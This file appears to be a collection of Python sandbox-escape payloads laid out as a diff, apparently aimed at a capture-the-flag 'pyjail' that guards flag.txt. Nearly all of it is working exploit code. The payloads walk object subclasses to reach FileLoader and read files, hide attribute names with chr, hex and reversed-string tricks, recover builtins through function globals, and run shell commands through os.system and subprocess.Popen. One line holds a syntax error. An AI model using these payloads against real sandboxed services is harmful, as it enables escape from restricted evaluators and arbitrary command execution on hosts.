@@ -1,1 +1,74 @@
 [(i, (()).__class__.__bases__[0].__subclasses__()[i]) for i in range(120,170)]
+
+
+
+
+
+
+chr map with one-liner lambda:
+print((lambda cls, fn: type(cls).__getattribute__(cls, ''.join(map(chr,[103,101,116,95,100,97,116,97])))(fn))(
+    [c for c in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(c)][0]('.', 'flag.txt'),
+    'flag.txt'
+))
+Hex bytes decode:
+loader = ().__class__.__bases__[0].__subclasses__()[122]('.', 'flag.txt')
+name = bytes.fromhex('6765745f64617461').decode()
+print(type(loader).__getattribute__(loader, name)('flag.txt'))
+String slice trick:
+loader = [c for c in ().__class__.__bases__[0].__subclasses__() if str(c).endswith('FileLoader'>)][0]('.', 'flag.txt')
+method = 'atad_teg'[::-1]
+print(type(loader).__getattribute__(loader, method)('flag.txt'))
+format plus dynamic filename:
+fn = ''.join(format(x,'c') for x in (102,108,97,103,46,116,120,116))
+loader = ().__class__.__bases__[0].__subclasses__()[122]('.', fn)
+method = ''.join(format(x,'c') for x in (103,101,116,95,100,97,116,97))
+print(type(loader).__getattribute__(loader, method)(fn))
+filter over __dict__ to locate the method automatically:
+loader = ().__class__.__bases__[0].__subclasses__()[122]('.', 'flag.txt')
+method = next(filter(lambda k: k[:3]=='get', type(loader).__dict__))
+print(type(loader).__getattribute__(loader, method)('flag.txt'))
+Bytearray shuffle:
+loader = [c for c in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(c)][0]('.', 'flag.txt')
+method = bytearray([103,101,116,95,100,97,116,97]).decode()
+print(type(loader).__getattribute__(loader, method)('flag.txt'))
+Flag via Recovered Builtins
+
+open after rescuing the real builtins:
+subs = ().__class__.__bases__[0].__subclasses__()
+func = [c for c in subs if type(c.__init__).__name__=='function'][0]
+globs = type(func.__init__).__getattribute__(func.__init__, ''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])))
+builtins_dict = globs[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))]
+print(builtins_dict['open']('flag.txt').read())
+pathlib read (imported through the same path):
+subs = ().__class__.__bases__[0].__subclasses__()
+func = [c for c in subs if type(c.__init__).__name__=='function'][0]
+globs = type(func.__init__).__getattribute__(func.__init__, '__globals__')
+builtins_dict = globs['__builtins__']
+pathlib = builtins_dict['__import__']('pathlib')
+print(pathlib.Path('flag.txt').read_text())
+Command Execution
+
+RCE via os.system (same string obfuscation as before):
+subs = ().__class__.__bases__[0].__subclasses__()
+func = [c for c in subs if type(c.__init__).__name__=='function'][0]
+get = type(func.__init__).__getattribute__
+gl = get(func.__init__, ''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95])))
+bdict = gl[''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))]
+importer = bdict[''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))]
+os_mod = importer(''.join(map(chr,[111,115])))
+type(os_mod).__getattribute__(os_mod, ''.join(map(chr,[115,121,115,116,101,109])))('cmd /c whoami')
+subprocess.Popen after importing subprocess:
+subs = ().__class__.__bases__[0].__subclasses__()
+func = [c for c in subs if type(c.__init__).__name__=='function'][0]
+gl = type(func.__init__).__getattribute__(func.__init__, '__globals__')
+builtins_dict = gl['__builtins__']
+importer = builtins_dict['__import__']
+importer('subprocess')
+popen = [c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')=='Popen'][0]
+print(popen(['cmd','/c','type','flag.txt'], stdout=-1).communicate()[0])
+sys.modules route once builtins are back (helps if you want to follow cheatsheet patterns):
+subs = ().__class__.__bases__[0].__subclasses__()
+func = [c for c in subs if type(c.__init__).__name__=='function'][0]
+globs = type(func.__init__).__getattribute__(func.__init__, '__globals__')
+sys_mod = globs['__builtins__']['__import__']('sys')
+sys_mod.modules['os'].system('cmd /c echo win')
